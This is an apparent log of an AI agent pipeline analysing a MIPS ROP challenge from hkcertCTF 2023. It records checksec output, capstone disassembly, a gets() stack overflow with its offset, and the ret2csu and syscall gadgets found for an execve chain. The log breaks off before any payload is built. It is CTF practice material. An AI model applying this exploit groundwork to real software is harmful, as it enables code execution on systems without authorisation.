13:42:36 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

13:42:36 --- S1 Recon ---
13:42:36 === recon (bug_id=-) ===
13:42:36 [recon] → 调用 GLM...
13:42:42 [recon] ← GLM(5.3s): 调工具[elf_info, checksec, identify_libc, sections, list_strings]
13:42:42 [recon] 我先并行收集二进制的基础信息：架构、保护机制、libc、段表、符号、字符串。
13:42:42 [recon]   → 工具 elf_info({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:42:42 [recon]   → 工具 checksec({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:42:42 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:42:42 [recon]   → 工具 sections({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:42:42 [recon]   → 工具 list_strings({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "max_lines": 200})
13:42:42 [recon]   ← sections(0.0s): There are 35 section headers, starting at offset 0x94f10: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type            Addr     Off    Size   ES F...(3334 chars)
13:42:42 [recon]   ← identify_libc(0.0s): ===LIBC VERSION=== ⏎ 
13:42:42 [recon]   ← elf_info(0.0s): /work/workspace/0024-2023-51-mips-rop-20260909-134236/target: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildI...(2606 chars)
13:42:42 [recon]   ← list_strings(0.0s): 4'9C ⏎ p&0* ⏎ A'9%P ⏎ @(%$B ⏎ @'9g ⏎ A'9%P ⏎ F$DS ⏎ F$DS ⏎ d !< ⏎ 0%'9w ⏎ 0%'9w ⏎ (%'9 ⏎ @'9g ⏎ @'9t ⏎  %'9 ⏎ ` %$ ⏎ 0%'9 ⏎ @ %& ⏎ G$Gr ⏎ F$BT ⏎  %'9 ...(1481 chars)
13:42:42 [recon]   ← checksec(0.2s): [*] '/work/workspace/0024-2023-51-mips-rop-20260909-134236/target' ⏎     Arch:       mips-32-big ⏎     RELRO:      Partial RELRO ⏎     Stack:      Can...(284 chars)
13:42:42 [recon] → 调用 GLM...
13:42:46 [recon] ← GLM(4.0s): 调工具[symbols, global_vars, probe_io, cfg]
13:42:46 [recon] 静态链接 MIPS32 BE 二进制。字符串列表里没看到明显的菜单字符串，可能是被混淆或字符串在 .rodata 里以特殊方式存储。我继续收集符号、全局变量、GOT/PLT、CFG，并探测 I/O。
13:42:46 [recon]   → 工具 symbols({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "main", "max_lines": 40})
13:42:46 [recon]   → 工具 global_vars({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "max_lines": 80})
13:42:46 [recon]   → 工具 probe_io({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "max_lines": 60})
13:42:46 [recon]   → 工具 cfg({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:42:46 [recon]   ← probe_io(0.6s): 00000000: 2f62 696e 2f73 683a 2031 3a20 2f77 6f72  /bin/sh: 1: /wor ⏎ 00000010: 6b2f 776f 726b 7370 6163 652f 3030 3234  k/workspace/0024 ⏎ 00000020: ...(416 chars)
13:42:46 [recon]   ← global_vars(0.6s):     35: 0048e938     0 OBJECT  LOCAL  DEFAULT   16 __CTOR_LIST__ ⏎     36: 0048e940     0 OBJECT  LOCAL  DEFAULT   17 __DTOR_LIST__ ⏎     37: 0047b1e0...(5474 chars)
13:42:46 [recon]   ← symbols(0.6s): 0040f92c T _IO_switch_to_main_get_area ⏎ 0043df24 T _IO_switch_to_main_wget_area ⏎ 00400860 T __libc_start_main ⏎ 004919a8 d _dl_main_map ⏎ 00475e74 R...(490 chars)
13:43:07 [recon]   ← cfg(20.9s): [{"name": "_init", "addr": "0x400264", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_40029c", "addr": "0x40029c", "blocks": 2, "cal...(6909 chars)
13:43:07 [recon] → 调用 GLM...
13:43:11 [recon] ← GLM(4.6s): 调工具[disassemble, got_plt, symbols]
13:43:11 [recon] 关键发现：`main` 调用了 `_IO_gets`（gets，无边界检查的栈缓冲读取），且 NX disabled + 静态链接 MIPS。这是典型的 ROP 题。probe_io 因 MIPS 架构在当前环境无法执行（Exec format error）。我需要反汇编 main 看具体逻辑，并查
13:43:11 [recon]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "main", "lines": 120})
13:43:11 [recon]   → 工具 got_plt({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:43:11 [recon]   → 工具 symbols({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "gets", "max_lines": 20})
13:43:11 [recon]   ← got_plt(0.0s): []
13:43:11 [recon]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:43:11 [recon]   ← symbols(0.0s): 00408ce0 T _IO_gets ⏎ 0040bd70 T __fgets_unlocked ⏎ 0040bd70 W fgets_unlocked ⏎ 00408ce0 W gets ⏎ 
13:43:11 [recon] → 调用 GLM...
13:43:15 [recon] ← GLM(3.3s): 调工具[execute, symbols]
13:43:15 [recon] objdump 默认架构不匹配，需要指定 mips。我用 execute 调用 objdump 指定架构反汇编 main，同时查关键符号偏移。
13:43:15 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && objdump -d -M mips:4000 --no-show-raw-insn target --start-address=0x4007a0 --)
13:43:15 [recon]   → 工具 symbols({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "stack_chk", "max_lines": 10})
13:43:15 [recon]   ← execute(0.0s):  ⏎ target:     file format elf32-big ⏎  ⏎ objdump: can't disassemble for architecture UNKNOWN! ⏎  ⏎  ⏎ [Command succeeded with exit code 0]
13:43:15 [recon]   ← symbols(0.0s): 0041f3c0 T __stack_chk_fail ⏎ 0041f3c0 T __stack_chk_fail_local ⏎ 00490958 D __stack_chk_guard ⏎ 
13:43:15 [recon] → 调用 GLM...
13:43:19 [recon] ← GLM(4.1s): 调工具[execute]
13:43:19 [recon] objdump 无法识别 MIPS。我尝试用 readelf 确认，并改用其他方式反汇编。先看 main 附近的原始字节，再用 angr 或其他工具。
13:43:19 [recon]   → 工具 execute({"command": "which mips-linux-gnu-objdump mipsel-linux-gnu-objdump objdump 2>&1; objdump --version 2>&1 | head -3; readelf -A /work/workspace/0024-202)
13:43:19 [recon]   ← execute(0.0s): which: no mips-linux-gnu-objdump in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin) ⏎ which: no mipsel-linux-gnu-objdump in (/usr/local...(805 chars)
13:43:19 [recon] → 调用 GLM...
13:43:24 [recon] ← GLM(5.0s): 调工具[execute]
13:43:24 [recon] objdump 2.42 不支持 MIPS 反汇编。我用 angr 的 disassembly 功能或直接用 python+pwn/capstone 来反汇编 main。先用 angr 提取 main 的指令，或用 execute 跑 python capstone。
13:43:24 [recon]   → 工具 execute({"command": "python3 -c \"\nfrom capstone import *\nimport struct\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 + CS_MODE_BIG_ENDIAN)\nwith open('/work/worksp)
13:43:24 [recon]   ← execute(0.1s): 0x4007a0:	addiu	$sp, $sp, -0x68 ⏎ 0x4007a4:	sw	$ra, 0x64($sp) ⏎ 0x4007a8:	sw	$fp, 0x60($sp) ⏎ 0x4007ac:	move	$fp, $sp ⏎ 0x4007b0:	lui	$gp, 0x4a ⏎ 0x40...(1335 chars)
13:43:24 [recon] → 调用 GLM...
13:43:33 [recon] ← GLM(8.9s): 调工具[execute, execute]
13:43:33 [recon] main 逻辑清晰：puts 两次（打印 banner），fflush(stdout)，然后 `gets(fp+0x18)` —— 栈缓冲区在 fp+0x18，ra 在 fp+0x64，缓冲区到 ra 距离 = 0x64-0x18 = 0x4c = 76 字节。gets 无边界检查 = 栈溢出。NX
13:43:33 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\n# 读取 .rodata 中 main 引用的两个字符串 0x4653c0 和 0x4653dc\nwith open('t)
13:43:33 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && readelf -r target 2>&1 | head -40; echo \"=== GOT entries ===\"; readelf -sW )
13:43:33 [recon]   ← execute(0.0s):  ⏎ Relocation section '.rel.dyn' at offset 0x18c contains 27 entries: ⏎  Offset     Info    Type            Sym.Value  Sym. Name ⏎ 00000000  00000000 ...(3297 chars)
13:43:33 [recon]   ← execute(0.0s): str1 @0x4653c0: b'Welcome to hkcertCTF 2023' ⏎ str2 @0x4653dc: b'input : ' ⏎  ⏎ [Command succeeded with exit code 0]
13:43:33 [recon] → 调用 GLM...
13:43:42 [recon] ← GLM(9.2s): 调工具[execute, execute]
13:43:42 [recon] 静态链接，无动态重定位（rel.dyn 全 NONE）。现在查关键 libc 函数符号地址（system/execve 等）和 stack_chk_guard，以及确认 .got 段内容。
13:43:42 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && readelf -sW target 2>&1 | grep -iE ' (system|execve|execv|popen|__libc_system)
13:43:42 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\n# 检查 main 中是否引用了 __stack_chk_guard\n# main 的 gp = 0x4a0000 - 0)
13:43:42 [recon]   ← execute(0.0s):    826: 00490958     4 OBJECT  GLOBAL DEFAULT   18 __stack_chk_guard ⏎   1046: 0041f3c0    32 FUNC    GLOBAL DEFAULT    7 __stack_chk_fail ⏎   1109: 0...(480 chars)
13:43:42 [recon]   ← execute(0.0s): puts_got @0x492310 -> 0x408f50 ⏎ stdout_got @0x492314 -> 0x491404 ⏎ fflush_got @0x492318 -> 0x408910 ⏎ gets_got @0x49231c -> 0x408ce0 ⏎  ⏎ [Command su...(175 chars)
13:43:42 [recon] → 调用 GLM...
13:43:52 [recon] ← GLM(9.7s): 调工具[execute, execute]
13:43:52 [recon] 重要发现：main 中没有引用 `__stack_chk_guard`，说明 main 函数没有 canary 保护（尽管二进制整体有 canary 符号）。gets 直接溢出到 ra。现在确认是否有 system/execve，以及查找 ROP gadget（cache invalidate + 
13:43:52 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && readelf -sW target 2>&1 | grep -iE ' (system|execve|execv|execl|__execve|do_s)
13:43:52 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\n# 查找 ROP gadget: jr \\$ra 和 cache 指令\nfrom capstone import *\n)
13:43:52 [recon]   ← execute(0.1s): === /bin/sh string === ⏎  ⏎ [Command succeeded with exit code 0]
13:43:52 [recon]   ← execute(0.3s): Total jr $ra gadgets: 815 ⏎ 0x40038c: addiu $a0, $sp, -0x68 ⏎ 0x4004c4: addiu $a0, $sp, 0xa4 ⏎ 0x400a38: addiu $a0, $sp, 0x18 ⏎ 0x401210: addiu $a0, $...(1355 chars)
13:43:52 [recon] → 调用 GLM...
13:44:03 [recon] ← GLM(11.5s): 调工具[execute, execute]
13:44:03 [recon] 没有 system/execve 符号，也没有 /bin/sh 字符串。这是纯 ROP 题——需要用 syscall gadget。MIPS 的 syscall 指令。我查找 syscall gadget 和 set_a0/set_a1/set_a2 的 gadget 链。
13:44:03 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:03 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\n# 查找 'sh' 字符串 (用于 execve)\nwith open('target','rb') as f:\n   )
13:44:04 [recon]   ← execute(0.0s): b'sh\x00' at vaddr 0x477504 (rodata) ⏎  ⏎ [Command succeeded with exit code 0]
13:44:04 [recon]   ← execute(0.2s): syscall count: 142 ⏎   syscall @ 0x40042c ⏎   syscall @ 0x400b80 ⏎   syscall @ 0x400e94 ⏎   syscall @ 0x40219c ⏎   syscall @ 0x402234 ⏎   syscall @ 0x...(290 chars)
13:44:04 [recon] → 调用 GLM...
13:44:12 [recon] ← GLM(8.8s): 调工具[execute]
13:44:12 [recon] 有 syscall gadget 和 "sh\x00" 字符串。现在查找关键的 ROP gadget：设置 $a0/$a1/$a2 寄存器后跟 jr $ra 的序列。MIPS execve syscall 号是 4011 (0xfab)。我查找 `li $a0` / `lw $a0` + `jr $
13:44:12 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:13 [recon]   ← execute(0.2s): === a0 setters near jr $ra (first 8) === ⏎   jr@0x400ff0 delay/setter@0x400ff4: addu $v0, $a0, $v0 ⏎   jr@0x4075d0 delay/setter@0x4075d4: sw $v1, 0x26...(2011 chars)
13:44:13 [recon] → 调用 GLM...
13:44:20 [recon] ← GLM(7.3s): 调工具[execute]
13:44:20 [recon] 这些 gadget 比较复杂。MIPS ROP 通常需要从 `__libc_csu_init` 之类的函数中找通用的 gadget 链（类似 x86 的 ret2csu）。我反汇编 `__libc_csu_init` 和 `__libc_csu_fini`，以及查找更简单的 `lw $a0, off
13:44:20 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:20 [recon]   ← execute(0.1s): === __libc_csu_init === ⏎ 0x401000: addiu $sp, $sp, -0x38 ⏎ 0x401004: lui $gp, 0x4a ⏎ 0x401008: sw $s5, 0x30($sp) ⏎ 0x40100c: lui $s5, 0x49 ⏎ 0x401010...(2391 chars)
13:44:20 [recon] → 调用 GLM...
13:44:30 [recon] ← GLM(10.2s): 调工具[execute, execute]
13:44:30 [recon] 找到了经典的 MIPS ret2csu gadget。在 `0x401058`-`0x401078` 有一个循环：`lw $t9, ($s0); jalr $t9; move $a0, $s2; move $a1, $s3; move $a2, $s4`，以及尾部 `0x4010c4` 的 epil
13:44:30 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && readelf -lW target 2>&1 | grep -E 'LOAD|GNU_STACK|GNU_RELRO'; echo \"=== chec)
13:44:30 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\n# 确认 main 栈帧布局\n# sp = fp, 栈帧 0x68\n# buf at fp+0x18 (sp+0x18))
13:44:30 [recon]   ← execute(0.0s):   LOAD           0x000000 0x00400000 0x00400000 0x7dd84 0x7dd84 R E 0x10000 ⏎   LOAD           0x07e867 0x0048e867 0x0048e867 0x03e4d 0x04c35 RW  0x10...(647 chars)
13:44:30 [recon]   ← execute(0.0s): Stack frame layout (main @ 0x4007a0): ⏎   frame size: 0x68 (104 bytes) ⏎   buf (gets arg): fp+0x18 = sp+0x18 ⏎   saved gp: fp+0x10 = sp+0x10 ⏎   saved...(360 chars)
13:44:30 [recon] → 调用 GLM...
13:44:37 [recon] ← GLM(6.5s): 调工具[execute]
13:44:37 [recon] 没有 GNU_STACK 段（MIPS 静态链接默认），checksec 报告 NX disabled + RWX。第一个 LOAD 段 R E（可读可执行），第二个 RW（可读写）。没有独立的 GNU_STACK 意味着栈继承可执行权限。  现在我有足够的事实。让我最后确认一下 ret2csu e
13:44:37 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:37 [recon]   ← execute(0.2s): syscall@0x40042c: addiu $a2, $zero, 1 | move $a3, $zero | addiu $v0, $zero, 0x108e | syscall  ⏎ syscall@0x400b80: move $v0, $zero | move $a0, $zero | ...(2898 chars)
13:44:37 [recon] → 调用 GLM...
13:44:45 [recon] ← GLM(8.0s): 调工具[execute]
13:44:45 [recon] 关键发现：`0x400b80` 处有 `addiu $v0, $zero, 0xfa1; syscall` —— 0xfa1 = 4001 = MIPS `exit` syscall。还有 `0x406840` 处 `addiu $v0, $zero, 0x1063; syscall` (0x106
13:44:45 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:45 [recon]   ← execute(0.2s): <no output> ⏎ [Command succeeded with exit code 0]
13:44:45 [recon] → 调用 GLM...
13:44:53 [recon] ← GLM(8.3s): 调工具[execute]
13:44:53 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:44:54 [recon]   ← execute(0.2s): syscall@0x400b80 -> b 0x400b7c: prev=addiu $v0, $zero, 0xfa1 ⏎ syscall@0x40219c -> b 0x40195c: prev=addiu $v0, $zero, 0x108e ⏎ syscall@0x402234 -> b 0...(1954 chars)
13:44:54 [recon] → 调用 GLM...
13:45:05 [recon] ← GLM(11.5s): 调工具[execute]
13:45:05 [recon] 重要发现：`0x40f2ac` 处有 `addiu $v0, $zero, 0x108e; syscall; jr $ra` —— syscall 后直接 jr $ra！0x108e = 4238 = `fstat`。但关键是这个 `syscall; jr $ra` 模式可以作为通用 syscall
13:45:05 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:45:05 [recon]   ← execute(0.2s): syscall@0x40f2ac prev=addiu $v0, $zero, 0x108e next=jr $ra ⏎ syscall@0x4119b8 prev=addiu $v0, $zero, 0x108e next=jr $ra ⏎ syscall@0x41f344 prev=lw $v0...(548 chars)
13:45:05 [recon] → 调用 GLM...
13:45:10 [recon] ← GLM(4.6s): 调工具[execute]
13:45:10 [recon] 极佳发现！`0x41f344` 和 `0x41f354` 处有 `lw $v0, offset($sp); syscall; jr $ra` —— 这意味着可以从栈上加载 syscall 号到 $v0，然后执行 syscall 并返回。这是非常强大的 ROP gadget。让我看看这个函数的完整上下
13:45:10 [recon]   → 工具 execute({"command": "cd /work/workspace/0024-2023-51-mips-rop-20260909-134236 && python3 -c \"\nfrom capstone import *\nmd = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 +)
13:45:10 [recon]   ← execute(0.1s): 0x41f300: addiu $s1, $v0, 1 ⏎ 0x41f304: lui $v0, 0x49 ⏎ 0x41f308: sw $s1, 0x18e0($v0) ⏎ 0x41f30c: lui $v0, 0x49 ⏎ 0x41f310: lw $v1, ($s0) ⏎ 0x41f314: ...(1017 chars)
13:45:10 [recon] → 调用 GLM...
13:46:27 [recon] ← GLM(76.8s): 调工具[submit_final_result]
13:46:27 [recon] 完美。`0x41f340` 处有 `lw $v0, 0x14($sp); syscall; jr $ra`（delay slot `move $v1, $a3`）。这是理想的 syscall gadget：从栈上 sp+0x14 加载 syscall 号到 $v0，执行 syscall，然后 jr 
13:46:27 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，14998 chars）
13:46:27 [recon] → 调用 GLM...
13:46:34 [recon] ← GLM(7.3s)
13:46:34 [recon] S1 侦察完成。已提交完整的 ReconReport JSON。  核心发现摘要：  1. **二进制**：MIPS32r2 大端、静态链接、未 strip，hkcertCTF 2023 题目 2. **保护机制**：NX disabled（栈可执行）、No PIE（固定地址）、Partial RE
13:46:34 [stage1] 保存 → /work/workspace/0024-2023-51-mips-rop-20260909-134236/stage1.json
13:46:34 --- S2 Semantic ---
13:46:34 === semantic (bug_id=-) ===
13:46:34 [semantic] → 调用 GLM...
13:46:39 [semantic] ← GLM(4.9s): 调工具[disassemble, disassemble]
13:46:39 [semantic] 我将基于 S1 提供的二进制事实进行语义级漏洞分析。首先验证关键事实：反汇编 main 函数确认 gets 调用和栈帧布局。
13:46:39 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "main", "lines": 80})
13:46:39 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "_IO_gets", "lines": 120})
13:46:39 [semantic]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:46:39 [semantic]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:46:39 [semantic] → 调用 GLM...
13:46:42 [semantic] ← GLM(2.9s): 调工具[symbols, list_strings]
13:46:42 [semantic] objdump 不支持 MIPS 架构。S1 已经提供了详细的反汇编结果，我直接基于 S1 事实进行分析。让我验证 _IO_gets 的实现逻辑，确认它确实没有边界检查。
13:46:42 [semantic]   → 工具 symbols({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "gets", "max_lines": 20})
13:46:42 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "filter": "hkcert", "max_lines": 10})
13:46:42 [semantic]   ← symbols(0.0s): 00408ce0 T _IO_gets ⏎ 0040bd70 T __fgets_unlocked ⏎ 0040bd70 W fgets_unlocked ⏎ 00408ce0 W gets ⏎ 
13:46:42 [semantic]   ← list_strings(0.0s): Welcome to hkcertCTF 2023 ⏎ 
13:46:42 [semantic] → 调用 GLM...
13:47:27 [semantic] ← GLM(45.1s): 调工具[submit_final_result]
13:47:27 [semantic] 符号确认：`gets`/`_IO_gets` 在 0x408ce0，`main` 在 0x4007a0。字符串确认存在。S1 事实一致。  现在基于 S1 提供的完整反汇编事实进行语义分析。让我梳理核心数据流：  **main 函数栈帧分析（基于 S1 反汇编）：** - `addiu $sp,$s
13:47:27 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，5659 chars）
13:47:27 [semantic] → 调用 GLM...
13:47:34 [semantic] ← GLM(6.7s)
13:47:34 [semantic] S2 语义漏洞分析已完成并提交。  **分析总结：**  发现 **1 个高危漏洞**：  - **BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS**   - **根因**：`main` 函数使用 `gets`（无界输入函数）读取 stdin 到栈缓冲区 
13:47:34 [stage2] 保存 → /work/workspace/0024-2023-51-mips-rop-20260909-134236/stage2.json
13:47:34 --- S3 Primitive（所有 bug） ---
13:47:34 === impact (bug_id=BUG-001) ===
13:47:34 [impact:BUG-001] → 调用 GLM...
13:47:37 [impact:BUG-001] ← GLM(3.5s): 调工具[disassemble, checksec]
13:47:37 [impact:BUG-001] 我将分析 BUG-001（通过 `gets` 导致的栈缓冲区溢出）并推导/验证原语。让我先从检查二进制文件和关键函数开始。
13:47:38 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target", "function": "main", "lines": 80})
13:47:38 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"})
13:47:38 [impact:BUG-001]   ← disassemble(0.0s): [stderr] objdump: can't disassemble for architecture UNKNOWN!
13:47:38 [impact:BUG-001]   ← checksec(0.3s): [*] '/work/workspace/0024-2023-51-mips-rop-20260909-134236/target' ⏎     Arch:       mips-32-big ⏎     RELRO:      Partial RELRO ⏎     Stack:      Can...(284 chars)
13:47:38 [impact:BUG-001] → 调用 GLM...
13:47:41 [impact:BUG-001] ← GLM(3.1s): 调工具[execute, execute]
13:47:41 [impact:BUG-001] objdump 无法直接反汇编 MIPS。让我尝试使用带有正确标志的 execute 命令，并检查我们是否拥有 MIPS 模拟器 (qemu-mips)。
13:47:41 [impact:BUG-001]   → 工具 execute({"command": "which qemu-mips qemu-mips-static 2>/dev/null; dpkg -l | grep qemu-user 2>/dev/null | head -5; ls /usr/bin/qemu-mips* 2>/dev/null"})
13:47:41 [impact:BUG-001]   → 工具 execute({"command": "file /work/workspace/0024-2023-51-mips-rop-20260909-134236/target; readelf -h /work/workspace/0024-2023-51-mips-rop-20260909-134236/targe)
13:47:41 [impact:BUG-001]   ← execute(0.0s): /work/workspace/0024-2023-51-mips-rop-20260909-134236/target: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildI...(1298 chars)
13:47:41 [impact:BUG-001]   ← execute(0.1s): <no output> ⏎  ⏎ Exit code: 2 ⏎ [Command failed with exit code 2]
13:47:41 [impact:BUG-001] → 调用 GLM...
13:47:45 [impact:BUG-001] ← GLM(3.7s): 调工具[execute, execute]
13:47:45 [impact:BUG-001] 没有可用的 qemu-mips。让我检查一下其他模拟选项，并尝试使用带有正确架构标志的 objdump。
13:47:45 [impact:BUG-001]   → 工具 execute({"command": "apt list --installed 2>/dev/null | grep -i mips; which mips-linux-gnu-objdump 2>/dev/null; objdump --version 2>/dev/null | head -2; pytho)
13:47:45 [impact:BUG-001]   → 工具 execute({"command": "pip3 install capstone 2>/dev/null | tail -3; python3 -c \"import capstone; print(capstone.__version__)\" 2>/dev/null"})
13:47:46 [impact:BUG-001]   ← execute(1.3s): Requirement already satisfied: capstone in /usr/local/lib/python3.12/dist-packages (5.0.9) ⏎ 5.0.7 ⏎  ⏎ [Command succeeded with exit code 0]
13:47:46 [impact:BUG-001]   ← execute(1.9s): GNU objdump (GNU Binutils for Ubuntu) 2.42 ⏎ Copyright (C) 2024 Free Software Foundation, Inc. ⏎ capstone available ⏎ angr available ⏎  ⏎ [Command suc...(174 chars)
13:47:46 [impact:BUG-001] → 调用 GLM...
13:47:52 [impact:BUG-001] ← GLM(5.2s): 调工具[execute]
13:47:52 [impact:BUG-001] Capstone 已就绪。让我使用 Python+Capstone 反汇编 main 函数，并检查关键地址。
13:47:52 [impact:BUG-001]   → 工具 execute({"command": "python3 << 'PYEOF'\nimport capstone\nimport struct\n\nwith open(\"/work/workspace/0024-2023-51-mips-rop-20260909-134236/target\", \"rb\"))
13:47:52 [impact:BUG-001]   ← execute(0.1s):  ⏎ Elf file type is EXEC (Executable file) ⏎ Entry point 0x4005a0 ⏎ There are 7 program headers, starting at offset 52 ⏎  ⏎ Program Headers: ⏎   Type ...(1353 chars)
13:47:52 [impact:BUG-001] → 调用 GLM...
13:47:57 [impact:BUG-001] ← GLM(4.8s): 调工具[execute]
13:47:57 [impact:BUG-001] 第一个 LOAD 段：文件偏移 0x0，虚拟地址 0x400000。因此，0x4007a0 处的 main 函数位于文件偏移 0x7a0。我来反汇编 main 函数和关键 ROP gadgets。
13:47:57 [impact:BUG-001]   → 工具 execute({"command": "python3 << 'PYEOF'\nimport capstone\n\nwith open(\"/work/workspace/0024-2023-51-mips-rop-20260909-134236/target\", \"rb\") as f:\n    dat)
13:47:57 [impact:BUG-001]   ← execute(0.1s): === main @ 0x4007a0 === ⏎   0x004007a0: addiu	$sp, $sp, -0x68 ⏎   0x004007a4: sw	$ra, 0x64($sp) ⏎   0x004007a8: sw	$fp, 0x60($sp) ⏎   0x004007ac: move...(2099 chars)
13:47:57 [impact:BUG-001] → 调用 GLM...
13:48:07 [impact:BUG-001] ← GLM(10.7s): 调工具[execute, execute]
13:48:07 [impact:BUG-001] 我已经完成了 main 函数的完整反汇编。现在让我来验证关键事实： - `main` 的栈帧大小为 0x68 - `sw $ra, 0x64($sp)` — 保存的 ra 位于 sp+0x64 - `sw $fp, 0x60($sp)` — 保存的 fp 位于 sp+0x60 - `sw $gp, 
13:48:07 [impact:BUG-001]   → 工具 execute({"command": "python3 << 'PYEOF'\nimport capstone\n\nwith open(\"/work/workspace/0024-2023-51-mips-rop-20260909-134236/target\", \"rb\") as f:\n    dat)
13:48:07 [impact:BUG-001]   → 工具 execute({"command": "which gdb-multiarch 2>/dev/null; gdb --version 2>/dev/null | head -1; python3 -c \"from pwn import *; print('pwntools available')\" 2>/de)
13:48:07 [impact:BUG-001]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
13:48:07 [impact:BUG-001]   ← execute(0.1s): === __libc_csu_init @ 0x401000 === ⏎   0x00401000: addiu	$sp, $sp, -0x38 ⏎   0x00401004: lui	$gp, 0x4a ⏎   0x00401008: sw	$s5, 0x30($sp) ⏎   0x0040100...(2723 chars)
13:48:07 [impact:BUG-001] → 调用 GLM...
13:48:14 [impact:BUG-001] ← GLM(7.1s): 调工具[execute, execute]
13:48:14 [impact:BUG-001] 所有关键代码已确认。现在让我检查一下是否有可用的 GDB 支持 MIPS 架构，并验证 "sh" 字符串的位置。
13:48:14 [impact:BUG-001]   → 工具 execute({"command": "gdb --configuration 2>/dev/null | grep -i mips; echo \"---\"; gdb -ex \"set architecture mips\" -ex \"quit\" 2>&1 | head -5"})
13:48:14 [impact:BUG-001]   → 工具 execute({"command": "python3 << 'PYEOF'\n# Verify \"sh\\x00\" string at 0x477504\nwith open(\"/work/workspace/0024-2023-51-mips-rop-20260909-134236/target\", )
13:48:14 [impact:BUG-001]   ← execute(0.0s): Bytes at 0x477504: b'sh\x00\x00chec' ⏎ Hex: 7368000063686563 ⏎ 'sh\x00' found at vaddr 0x00477504 ⏎  ⏎ [Command succeeded with exit code 0]
